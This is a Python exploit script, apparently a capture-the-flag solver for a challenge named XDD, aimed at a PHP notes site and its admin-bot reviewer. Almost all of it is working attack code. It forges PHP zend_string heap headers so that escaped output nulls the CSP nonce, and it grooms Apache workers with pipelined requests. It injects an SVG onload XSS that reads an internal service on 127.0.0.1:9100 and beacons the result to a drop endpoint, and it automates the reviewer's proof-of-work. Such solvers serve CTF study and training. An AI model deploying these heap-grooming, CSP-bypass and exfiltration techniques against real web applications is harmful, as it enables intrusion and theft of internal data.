#!/usr/bin/env python3
"""
XDD remote solver.

Usage:
  python3 solve.py \
      --site http://HOST:SITE_PORT \
      --review http://HOST:REVIEW_PORT

The URL submitted to the reviewer defaults to http://127.0.0.1:8080.
Override it with --browser-base if the instance uses another internal port.
"""
from __future__ import annotations

import argparse
import base64
import concurrent.futures
import hashlib
import html
import multiprocessing as mp
import os
import queue
import random
import re
import socket
import ssl
import struct
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable
from urllib.parse import parse_qsl, quote, urlencode, urljoin, urlsplit, urlunsplit

import requests

FLAG_RE = re.compile(rb"NHNC\{[^}\r\n]{1,512}\}")
TICKET_RE = re.compile(r'name=["\']ticket["\'][^>]*value=["\']([^"\']+)', re.I)
ZERO_RE = re.compile(r"starts with\s+(0+)", re.I)

# Recovered byte-for-byte from the browser heap artifact.  The source is 423
# bytes and its escaped result is 1184 bytes.  It preserves:
#   memo header @ output +424, len = 0x20000
#   four live 64-byte zend_string headers @ +936/+1000/+1064/+1128
ORIGINAL_BROWSER_NAME_B64 = (
    "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
    "QUFBQUFBQUFBQUFBQUFBQUFBPicnJycnJycnJycnJycnJycnJycnJycnJycnJycn"
    "JycnJycnJycnJycnJycnJycnJycnJwEAAAAWAAAAAAAAAAAAAAAAAAIAAAAAAEFB"
    "QSYnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycn"
    "JycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJwEAAAAWAAAAAAAAAAAA"
    "AAAgAAAAAAAAAD4nJycnJycCAAAAFgAAAAAAAAAAAAAAIAAAAAAAAAA+JycnJycn"
    "AQAAABYAAAAAAAAAAAAAACgAAAAAAAAAPicnJycnJwEAAAAWAAAAAAAAAAAAAAAg"
    "AAAAAAAAAGFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh"
)

SPECIAL = {
    0x26: b"&amp;",
    0x3C: b"&lt;",
    0x3E: b"&gt;",
    0x22: b"&quot;",
    0x27: b"&#039;",
}

GROOM_HEADER_PROFILES = {
    "minimal": {
        "User-Agent": "python-requests/2.32.5",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
    },
    "firefox": {
        "User-Agent": (
            "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) "
            "Gecko/20100101 Firefox/140.0"
        ),
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,*/*;q=0.8"
        ),
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
    },
}


@dataclass(frozen=True)
class Profile:
    name: str
    description: str
    payload_name: bytes
    memo_mode: str
    carry_mode: str


def html_escape_native(data: bytes) -> bytes:
    return b"".join(SPECIAL.get(ch, bytes([ch])) for ch in data)


def zend_header(refcount: int, length: int, hash_value: int = 0) -> bytes:
    return struct.pack("<IIQQ", refcount, 0x16, hash_value, length)


def build_exact_nul_name() -> bytes:
    """Keep the recovered layout exactly, but invalidate CSP with a NUL nonce."""
    data = bytearray(base64.b64decode(ORIGINAL_BROWSER_NAME_B64))
    assert len(data) == 423

    # Last preserved zend_string starts at source +367.  Its hash occupies
    # +375..+382 and data starts at +391.
    # NUL in JSON costs +5 bytes; changing one hash NUL to 'A' saves 5 bytes.
    # The serialized note therefore remains byte-for-byte the same length.
    data[375] = 0x41
    data[391] = 0x00
    return bytes(data)


def build_ascii_expansion_chunk(length: int, escaped_length: int) -> bytes:
    """Build JSON-cheap ASCII with an exact htmlspecialchars expansion."""
    extra = escaped_length - length
    if extra < 0 or extra > 5 * length:
        raise ValueError(f"cannot expand {length} bytes to {escaped_length}")

    # Added bytes per source byte: > => +3, & => +4, ' => +5.
    for quotes in range(min(length, extra // 5), -1, -1):
        left = extra - 5 * quotes
        for ampersands in range(min(length - quotes, left // 4), -1, -1):
            remainder = left - 4 * ampersands
            if remainder % 3:
                continue
            greater = remainder // 3
            if quotes + ampersands + greater <= length:
                regular = length - quotes - ampersands - greater
                result = b"'" * quotes + b"&" * ampersands + b">" * greater + b"A" * regular
                assert len(result) == length
                assert len(html_escape_native(result)) == escaped_length
                assert php_json_string_cost(result) == length + 2
                return result
    raise ValueError(f"no expansion chunk for {length=} {escaped_length=}")


def build_shifted_multi_nul_name(first_nonce_data_offset: int) -> bytes:
    """
    Variant of the four-slot CSP killer.  The memo header remains at +424,
    while four valid 64-byte zend_string chunks start at a selectable offset.

    `first_nonce_data_offset=512` covers nonce data at 512/576/640/704.
    Values through 960 are supported; the original profile covers
    960/1024/1088/1152.
    """
    if first_nonce_data_offset % 64 or not 512 <= first_nonce_data_offset <= 960:
        raise ValueError("first nonce data offset must be a 64-byte multiple in 512..960")

    memo_header = zend_header(1, 0x20000)
    fake_headers = (
        zend_header(1, 32, 0x41),
        zend_header(2, 32, 0x41),
        zend_header(1, 40, 0x41),
        zend_header(1, 32, 0x41),
    )
    nul_segment = b"\x00" + b"'" * 5 + b"&>"
    assert len(nul_segment) == 8 and len(html_escape_native(nul_segment)) == 40

    tail = b"".join(
        [
            fake_headers[0], nul_segment,
            fake_headers[1], nul_segment,
            fake_headers[2], nul_segment,
            fake_headers[3], b"\x00" + b"a" * 31,
        ]
    )
    assert len(tail) == 152 and len(html_escape_native(tail)) == 248

    # Escaped layout:
    #   prefix[424] | memo header[24] | middle | fake string header ...
    # A fake header starts 24 bytes before its data.
    middle_escaped = first_nonce_data_offset - 472
    trailing_escaped = 960 - first_nonce_data_offset
    remaining_source = 423 - len(memo_header) - len(tail)
    assert remaining_source == 247

    prefix = middle = trailing = None
    for prefix_length in range(1, remaining_source + 1):
        for middle_length in range(1, remaining_source - prefix_length + 1):
            trailing_length = remaining_source - prefix_length - middle_length
            if trailing_escaped == 0 and trailing_length != 0:
                continue
            if trailing_escaped != 0 and trailing_length <= 0:
                continue
            try:
                candidate_prefix = build_ascii_expansion_chunk(prefix_length, 424)
                candidate_middle = build_ascii_expansion_chunk(middle_length, middle_escaped)
                candidate_trailing = (
                    b""
                    if trailing_length == 0
                    else build_ascii_expansion_chunk(trailing_length, trailing_escaped)
                )
            except ValueError:
                continue
            prefix, middle, trailing = (
                candidate_prefix, candidate_middle, candidate_trailing
            )
            break
        if prefix is not None:
            break
    if prefix is None or middle is None or trailing is None:
        raise AssertionError("failed to construct shifted profile")

    result = prefix + memo_header + middle + tail + trailing
    escaped = html_escape_native(result)
    assert len(result) == 423
    assert len(escaped) == 1184
    assert php_json_string_cost(result) == 1005
    assert escaped[424:448] == memo_header
    for index, header in enumerate(fake_headers):
        data_offset = first_nonce_data_offset + 64 * index
        header_offset = data_offset - 24
        assert escaped[header_offset:header_offset + 24] == header
        assert escaped[data_offset] == 0
    return result


def build_multi_nul_name() -> bytes:
    """
    Invalidate any of the four adjacent 64-byte strings while preserving all
    headers and the exact JSON/escaped lengths of the recovered profile.

    Only the nonce is consumed after folio_frame(), so zeroing the other string
    contents is harmless and makes the profile tolerate a ±3 chunk shift.
    """
    original = base64.b64decode(ORIGINAL_BROWSER_NAME_B64)
    assert len(original) == 423

    # 163 source bytes -> 424 escaped bytes.  JSON cost is 163 bytes, exactly
    # three less than the recovered 166-byte prefix; this compensates the three
    # extra NUL-bearing source bytes in the 40-byte inter-header segments.
    prefix = b"A" * 110 + b">>" + b"'" * 51
    assert len(prefix) == 163 and len(html_escape_native(prefix)) == 424

    # Keep the recovered 84-byte source segment between memo and the first
    # 64-byte header.  It expands to 488 bytes.
    middle = original[190:274]
    assert len(middle) == 84 and len(html_escape_native(middle)) == 488

    # 8 source bytes -> 40 output bytes, with NUL as the first data byte.
    nul_segment = b"\x00" + b"'" * 5 + b"&>"
    assert len(nul_segment) == 8 and len(html_escape_native(nul_segment)) == 40

    result = b"".join(
        [
            prefix,
            zend_header(1, 0x20000),
            middle,
            zend_header(1, 32, 0x41),
            nul_segment,
            zend_header(2, 32, 0x41),
            nul_segment,
            zend_header(1, 40, 0x41),
            nul_segment,
            zend_header(1, 32, 0x41),
            b"\x00" + b"a" * 31,
        ]
    )
    assert len(result) == 423
    escaped = html_escape_native(result)
    assert len(escaped) == 1184
    assert escaped[424:448] == zend_header(1, 0x20000)
    assert escaped[936:960] == zend_header(1, 32, 0x41)
    assert escaped[1000:1024] == zend_header(2, 32, 0x41)
    assert escaped[1064:1088] == zend_header(1, 40, 0x41)
    assert escaped[1128:1152] == zend_header(1, 32, 0x41)
    return result


def build_nonce1_loader_name() -> bytes:
    """Fallback: keep the same layout but make the logical CSP nonce `a`."""
    data = bytearray(base64.b64decode(ORIGINAL_BROWSER_NAME_B64))
    assert len(data) == 423
    # 0x20 -> 0x01 adds five JSON bytes; hash NUL -> A removes five.
    data[375] = 0x41
    data[383] = 0x01
    return bytes(data)


def php_json_string_cost(data: bytes) -> int:
    """Length of PHP json_encode(data) for the ASCII/control bytes used here."""
    cost = 2  # surrounding quotes
    for ch in data:
        if ch in (0x22, 0x5C, 0x2F):
            cost += 2
        elif ch < 0x20:
            cost += 6
        else:
            cost += 1
    return cost


def build_exfil_js(slot: str) -> str:
    # No literal slash or quote that would make the JSON heap copy unusable.
    marker = "${a}"
    return (
        "a=String.fromCharCode(47);"
        f"fetch(`http:{marker}{marker}127.0.0.1:9100{marker}archive{marker}receipt`)"
        ".then(function(r){return r.text()})"
        f".then(function(v){{navigator.sendBeacon(`{marker}drop.php?slot={slot}`,v)}})"
    )


def build_svg_memo(slot: str, length: int = 405) -> bytes:
    payload = f"<svg onload='{build_exfil_js(slot)}'>"
    # One trailing slash gives the same PHP JSON encoded size as the recovered
    # 405-byte </script>-based memo, without creating a closing/raw-text tag.
    if len(payload) + 1 > length:
        raise ValueError("slot made SVG memo too large")
    memo = (payload + "M" * (length - len(payload) - 1) + "/").encode()
    assert len(memo) == length
    assert php_json_string_cost(memo) == 408
    # 421 escaped bytes => Zend allocation class 448, matching the name chunk.
    assert len(html_escape_native(memo)) == 421
    return memo


def build_loader_memo(slot: str, length: int = 405) -> bytes:
    code = build_exfil_js(slot)
    payload = f"<input id=x name=x value='{code}'>"
    if len(payload) + 1 > length:
        raise ValueError("slot made loader memo too large")
    memo = (payload + "M" * (length - len(payload) - 1) + "/").encode()
    assert len(memo) == length
    return memo


def build_profiles() -> list[Profile]:
    profiles = [
        Profile(
            "multi-nul",
            "CSP NUL across nonce data offsets A+960..A+1152",
            build_multi_nul_name(),
            "svg",
            "padding48",
        ),
        Profile(
            "multi-512",
            "CSP NUL across nonce data offsets A+512..A+704",
            build_shifted_multi_nul_name(512),
            "svg",
            "padding48",
        ),
        Profile(
            "multi-640",
            "CSP NUL across nonce data offsets A+640..A+832",
            build_shifted_multi_nul_name(640),
            "svg",
            "padding48",
        ),
        Profile(
            "multi-768",
            "CSP NUL across nonce data offsets A+768..A+960",
            build_shifted_multi_nul_name(768),
            "svg",
            "padding48",
        ),
        Profile(
            "multi-896",
            "CSP NUL across nonce data offsets A+896..A+1088",
            build_shifted_multi_nul_name(896),
            "svg",
            "padding48",
        ),
        Profile(
            "exact-nul",
            "Recovered browser layout with only the nonce data NULled",
            build_exact_nul_name(),
            "svg",
            "padding48",
        ),
        Profile(
            "nonce1-loader",
            "CSP nonce `a`; 48-byte carry installs a delayed loader",
            build_nonce1_loader_name(),
            "input",
            "loader48",
        ),
    ]
    for p in profiles:
        assert len(p.payload_name) == 423
        assert len(html_escape_native(p.payload_name)) == 1184
        assert php_json_string_cost(p.payload_name) == 1005
    return profiles


def normalize_base(url: str) -> str:
    return url.rstrip("/") + "/"


def create_note(session: requests.Session, site: str, name: bytes, memo: bytes) -> str:
    response = session.post(
        urljoin(site, "draft.php"),
        data=[("name", name), ("memo", memo), ("slot", "")],
        allow_redirects=False,
        timeout=15,
    )
    if response.status_code not in (302, 303):
        raise RuntimeError(f"draft failed: HTTP {response.status_code}: {response.text[:200]!r}")
    location = response.headers.get("Location", "")
    if not re.search(r"/view\.php\?id=[0-9a-f]{32}(?:$|&)", location):
        raise RuntimeError(f"unexpected draft location: {location!r}")
    return location


def append_query_pairs(path: str, pairs: Iterable[tuple[str, str]]) -> str:
    parsed = urlsplit(path)
    query = parse_qsl(parsed.query, keep_blank_values=True)
    query.extend(pairs)
    return urlunsplit(("", "", parsed.path, urlencode(query), ""))


def append_query(path: str, **values: str) -> str:
    return append_query_pairs(path, values.items())


def build_http_request(
    host_header: str,
    path: str,
    close: bool,
    header_mode: str,
) -> bytes:
    connection = "close" if close else "keep-alive"
    headers = GROOM_HEADER_PROFILES[header_mode]
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host_header}",
        *(f"{name}: {value}" for name, value in headers.items()),
        f"Connection: {connection}",
        "",
        "",
    ]
    return "\r\n".join(lines).encode()


def pipeline_groom_connection(
    site_parts,
    path: str,
    rounds: int,
    start_gate,
    timeout: float,
    header_mode: str,
) -> tuple[int, int]:
    host = site_parts.hostname
    if not host:
        raise ValueError("site URL has no hostname")
    port = site_parts.port or (443 if site_parts.scheme == "https" else 80)
    host_header = host if port in (80, 443) else f"{host}:{port}"
    raw = socket.create_connection((host, port), timeout=timeout)
    raw.settimeout(timeout)
    sock = raw
    if site_parts.scheme == "https":
        context = ssl.create_default_context()
        sock = context.wrap_socket(raw, server_hostname=host)
    try:
        start_gate.wait()
        packet = b"".join(
            build_http_request(
                host_header, path, close=(i == rounds - 1), header_mode=header_mode
            )
            for i in range(rounds)
        )
        sock.sendall(packet)
        received = bytearray()
        while True:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            received.extend(chunk)
        response_count = received.count(b"HTTP/1.1 ") + received.count(b"HTTP/1.0 ")
        return response_count, len(received)
    finally:
        try:
            sock.close()
        except OSError:
            pass


def groom_workers_pipeline(
    site: str,
    path: str,
    connections: int,
    rounds: int,
    timeout: float,
    header_mode: str,
) -> None:
    parts = urlsplit(site)
    if parts.scheme not in ("http", "https"):
        raise ValueError("pipeline grooming supports http/https only")
    gate = mp.Event()
    with concurrent.futures.ThreadPoolExecutor(max_workers=connections) as pool:
        futures = [
            pool.submit(
                pipeline_groom_connection, parts, path, rounds, gate, timeout, header_mode
            )
            for _ in range(connections)
        ]
        time.sleep(0.15)
        gate.set()
        completed = 0
        for future in concurrent.futures.as_completed(futures):
            responses, received = future.result()
            completed += 1
            print(
                f"    groom connection {completed}/{connections}: "
                f"{responses}/{rounds} responses, {received} bytes"
            )
            if responses < rounds:
                raise RuntimeError(
                    f"groom connection returned only {responses}/{rounds} responses; "
                    "lower --groom-rounds or use --groom-mode requests"
                )


def groom_workers_requests(
    site: str,
    path: str,
    connections: int,
    rounds: int,
    timeout: float,
    header_mode: str,
) -> None:
    target = urljoin(site, path.lstrip("/"))
    gate = mp.Event()

    def worker() -> tuple[int, int]:
        session = requests.Session()
        session.headers.update(GROOM_HEADER_PROFILES[header_mode])
        gate.wait()
        ok = 0
        total = 0
        try:
            for _ in range(rounds):
                response = session.get(target, timeout=timeout)
                total += len(response.content)
                ok += response.status_code == 200
        finally:
            session.close()
        return ok, total

    with concurrent.futures.ThreadPoolExecutor(max_workers=connections) as pool:
        futures = [pool.submit(worker) for _ in range(connections)]
        time.sleep(0.15)
        gate.set()
        for index, future in enumerate(concurrent.futures.as_completed(futures), 1):
            ok, total = future.result()
            print(f"    groom connection {index}/{connections}: {ok}/{rounds} OK, {total} response bytes")


def get_review_ticket(session: requests.Session, review: str) -> tuple[str, int]:
    response = session.get(review, timeout=15)
    response.raise_for_status()
    ticket_match = TICKET_RE.search(response.text)
    if not ticket_match:
        raise RuntimeError("review ticket not found")
    zero_match = ZERO_RE.search(html.unescape(response.text))
    difficulty = len(zero_match.group(1)) if zero_match else 5
    return html.unescape(ticket_match.group(1)), difficulty


def digest_matches(digest: bytes, difficulty: int) -> bool:
    full = difficulty // 2
    if any(digest[:full]):
        return False
    return difficulty % 2 == 0 or digest[full] >> 4 == 0


def pow_worker(prefix: bytes, difficulty: int, start: int, stride: int, found, output) -> None:
    value = start
    while not found.is_set():
        raw = str(value).encode()
        if digest_matches(hashlib.sha256(prefix + raw).digest(), difficulty):
            if not found.is_set():
                output.put(str(value))
                found.set()
            return
        value += stride


def solve_pow(ticket: str, difficulty: int, workers: int) -> str:
    workers = max(1, workers)
    prefix = ticket.encode() + b":"
    if workers == 1:
        value = 0
        while True:
            if digest_matches(hashlib.sha256(prefix + str(value).encode()).digest(), difficulty):
                return str(value)
            value += 1

    context = mp.get_context("fork" if sys.platform != "win32" else "spawn")
    found = context.Event()
    output = context.Queue()
    processes = [
        context.Process(target=pow_worker, args=(prefix, difficulty, i, workers, found, output), daemon=True)
        for i in range(workers)
    ]
    for process in processes:
        process.start()
    try:
        stamp = output.get()
    finally:
        found.set()
        for process in processes:
            process.terminate()
        for process in processes:
            process.join(timeout=1)
    return stamp


def submit_review(session: requests.Session, review: str, browser_url: str, pow_workers: int) -> None:
    ticket, difficulty = get_review_ticket(session, review)
    print(f"[*] reviewer PoW difficulty: {difficulty} hex zeroes")
    started = time.time()
    stamp = solve_pow(ticket, difficulty, pow_workers)
    print(f"[+] PoW solved in {time.time() - started:.2f}s: {stamp}")
    response = session.post(
        review,
        data={"url": browser_url, "ticket": ticket, "stamp": stamp},
        timeout=15,
    )
    if response.status_code != 200 or "Queued" not in response.text:
        raise RuntimeError(f"review submission failed: HTTP {response.status_code}: {response.text[:300]!r}")
    print("[+] reviewer queued the URL")


def poll_drop(session: requests.Session, site: str, slot: str, timeout: float) -> bytes | None:
    target = urljoin(site, "drop.php")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            response = session.get(target, params={"slot": slot}, timeout=8)
            match = FLAG_RE.search(response.content)
            if match:
                return match.group(0)
        except requests.RequestException:
            pass
        time.sleep(0.75)
    return None


def build_browser_url(
    browser_base: str,
    location: str,
    carry: str,
    shape_count: int,
    shape_length: int,
    layout_preset: str,
) -> str:
    # Ordering matters for Zend's request-variable allocations.  The dup56
    # preset intentionally replaces the same PHP key several times, leaving
    # 64-byte request-variable chunks in Zend's free list before the large
    # distinct shaping values are parsed.
    pairs: list[tuple[str, str]] = []
    if layout_preset == "dup56":
        pairs.extend(("g", "G" * 56) for _ in range(6))
    elif layout_preset == "distinct56":
        pairs.extend((f"g{i}", "G" * 56) for i in range(6))
    elif layout_preset != "classic":
        raise ValueError(f"unknown layout preset: {layout_preset}")
    pairs.extend((f"p{i}", "X" * shape_length) for i in range(shape_count))
    pairs.append(("carry", carry))
    path = append_query_pairs(location, pairs)
    return urljoin(browser_base, path.lstrip("/"))


def self_test(profiles: Iterable[Profile]) -> None:
    original = base64.b64decode(ORIGINAL_BROWSER_NAME_B64)
    assert len(original) == 423
    assert len(html_escape_native(original)) == 1184
    assert php_json_string_cost(original) == 1005
    for profile in profiles:
        escaped = html_escape_native(profile.payload_name)
        assert len(profile.payload_name) == 423
        assert len(escaped) == 1184
        assert escaped[424:448] == zend_header(1, 0x20000)
        assert php_json_string_cost(profile.payload_name) == 1005


def dump_payloads(directory: Path, profiles: Iterable[Profile]) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    for profile in profiles:
        (directory / f"name-{profile.name}.bin").write_bytes(profile.payload_name)
        (directory / f"escaped-{profile.name}.bin").write_bytes(html_escape_native(profile.payload_name))
    print(f"[+] payloads written to {directory}")


def main() -> int:
    parser = argparse.ArgumentParser(description="XDD CTF remote solver")
    parser.add_argument("--site", help="externally reachable Folio site, e.g. http://host:8080")
    parser.add_argument("--review", help="externally reachable reviewer, e.g. http://host:8081")
    parser.add_argument("--host", help="convenience target host when both services use HTTP")
    parser.add_argument("--site-port", type=int, default=8080)
    parser.add_argument("--review-port", type=int, default=8081)
    parser.add_argument(
        "--browser-base",
        default="http://127.0.0.1:8080",
        help="site base URL as seen inside the reviewer container",
    )
    parser.add_argument("--profile", default="auto", help="profile name, 'auto', or 'all'")
    parser.add_argument("--groom-connections", type=int, default=5)
    parser.add_argument("--groom-rounds", type=int, default=92)
    parser.add_argument(
        "--groom-rounds-list",
        help="comma-separated grooming counts, e.g. 88,92,96; overrides --groom-rounds",
    )
    parser.add_argument("--groom-carry-length", type=int, default=255)
    parser.add_argument("--shape-count", type=int, default=7)
    parser.add_argument("--shape-length", type=int, default=360)
    parser.add_argument("--final-carry-length", type=int, default=255)
    parser.add_argument("--groom-mode", choices=("pipeline", "requests"), default="pipeline")
    parser.add_argument(
        "--groom-header-modes",
        default="minimal",
        help="comma-separated prior-request header profiles: minimal,firefox",
    )
    parser.add_argument(
        "--layout-presets",
        default="classic",
        help="comma-separated final-query layouts: classic,dup56,distinct56",
    )
    parser.add_argument("--groom-timeout", type=float, default=30.0)
    parser.add_argument("--pow-workers", type=int, default=max(1, min(os.cpu_count() or 1, 8)))
    parser.add_argument("--poll-timeout", type=float, default=18.0)
    parser.add_argument("--attempts", type=int, default=1, help="attempts per selected profile")
    parser.add_argument("--no-groom", action="store_true")
    parser.add_argument("--dump-payloads", type=Path)
    args = parser.parse_args()

    profiles = build_profiles()
    self_test(profiles)
    if args.dump_payloads:
        dump_payloads(args.dump_payloads, profiles)
        if not args.site and not args.review:
            return 0

    if args.host:
        args.site = args.site or f"http://{args.host}:{args.site_port}"
        args.review = args.review or f"http://{args.host}:{args.review_port}"

    if not args.site or not args.review:
        parser.error(
            "provide --site and --review, or use --host with --site-port/--review-port"
        )

    site = normalize_base(args.site)
    review = args.review.rstrip("/") + "/"
    browser_base = normalize_base(args.browser_base)

    if args.profile == "all":
        selected = profiles
    elif args.profile == "broad":
        selected = [profile for profile in profiles if profile.name.startswith("multi-")]
    elif args.profile == "auto":
        # Known-good browser layout first, then the immediately-adjacent nonce
        # variant.  The noisier legacy fallbacks remain available via `all`.
        preferred = {"multi-nul", "multi-896"}
        selected = [profile for profile in profiles if profile.name in preferred]
    else:
        selected = [profile for profile in profiles if profile.name == args.profile]
    if not selected:
        parser.error(
            f"unknown profile {args.profile!r}; choices: auto, broad, all, "
            + ", ".join(p.name for p in profiles)
        )

    if args.groom_rounds_list:
        try:
            round_candidates = [int(item) for item in args.groom_rounds_list.split(",") if item.strip()]
        except ValueError as exc:
            parser.error(f"invalid --groom-rounds-list: {exc}")
        if not round_candidates or any(value < 0 or value >= 100 for value in round_candidates):
            parser.error("groom round values must be in 0..99")
    else:
        round_candidates = [args.groom_rounds]

    header_modes = [item.strip() for item in args.groom_header_modes.split(",") if item.strip()]
    invalid_headers = [item for item in header_modes if item not in GROOM_HEADER_PROFILES]
    if not header_modes or invalid_headers:
        parser.error(
            "invalid --groom-header-modes; choices: "
            + ", ".join(GROOM_HEADER_PROFILES)
        )

    layout_presets = [item.strip() for item in args.layout_presets.split(",") if item.strip()]
    valid_layouts = {"classic", "dup56", "distinct56"}
    invalid_layouts = [item for item in layout_presets if item not in valid_layouts]
    if not layout_presets or invalid_layouts:
        parser.error(
            "invalid --layout-presets; choices: classic, dup56, distinct56"
        )

    session = requests.Session()
    session.headers["User-Agent"] = "python-requests/2.32.5"

    # Create both notes before grooming.  Their creation requests can perturb a
    # worker, but all workers are normalized by the subsequent grooming phase.
    print("[*] creating 423/423 grooming note")
    groom_location = create_note(session, site, b"A" * 423, b"M" * 423)
    groom_path = append_query(groom_location, carry="R" * args.groom_carry_length)
    print(f"[+] groom note: {groom_location}")

    for profile in selected:
        for groom_rounds in round_candidates:
            for header_mode in header_modes:
                for layout_preset in layout_presets:
                    for attempt in range(1, args.attempts + 1):
                        slot = os.urandom(8).hex()
                        memo = (
                            build_svg_memo(slot)
                            if profile.memo_mode == "svg"
                            else build_loader_memo(slot)
                        )
                        print(
                            f"\n[*] profile={profile.name} rounds={groom_rounds} "
                            f"headers={header_mode} layout={layout_preset} "
                            f"attempt={attempt}/{args.attempts}"
                        )
                        print(f"    {profile.description}")
                        try:
                            exploit_location = create_note(
                                session, site, profile.payload_name, memo
                            )
                            print(f"[+] exploit note: {exploit_location}")

                            if not args.no_groom and groom_rounds:
                                print(
                                    f"[*] grooming {args.groom_connections} Apache workers x "
                                    f"{groom_rounds} requests ({args.groom_mode}, {header_mode})"
                                )
                                if args.groom_mode == "pipeline":
                                    groom_workers_pipeline(
                                        site,
                                        groom_path,
                                        args.groom_connections,
                                        groom_rounds,
                                        args.groom_timeout,
                                        header_mode,
                                    )
                                else:
                                    groom_workers_requests(
                                        site,
                                        groom_path,
                                        args.groom_connections,
                                        groom_rounds,
                                        args.groom_timeout,
                                        header_mode,
                                    )
                                print("[+] grooming complete")

                            if profile.carry_mode == "padding48":
                                carry = "R" * args.final_carry_length
                            else:
                                carry = (
                                    "<script nonce=a>onload=_=>eval(x.value)</script>"
                                )
                                assert len(carry) == 48

                            browser_url = build_browser_url(
                                browser_base,
                                exploit_location,
                                carry,
                                args.shape_count,
                                args.shape_length,
                                layout_preset,
                            )
                            print(f"[*] reviewer URL length: {len(browser_url)}")
                            print(
                                f"    {browser_url[:180]}"
                                f"{'...' if len(browser_url) > 180 else ''}"
                            )
                            submit_review(
                                session, review, browser_url, args.pow_workers
                            )
                            print(f"[*] polling drop slot {slot}")
                            flag = poll_drop(
                                session, site, slot, args.poll_timeout
                            )
                            if flag:
                                decoded = flag.decode(errors="replace")
                                print(f"\n<FLAG>{decoded}</FLAG>")
                                return 0
                            print("[-] no flag returned for this attempt")
                        except (
                            requests.RequestException,
                            OSError,
                            RuntimeError,
                            ValueError,
                        ) as exc:
                            print(f"[-] attempt failed: {exc}")
                            time.sleep(1.0)
                            continue

    print("[-] all selected profiles finished without a flag")
    print(
        "    Retry with --profile broad --groom-rounds-list 88,92,96 "
        "--groom-header-modes minimal,firefox "
        "--layout-presets classic,dup56."
    )
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
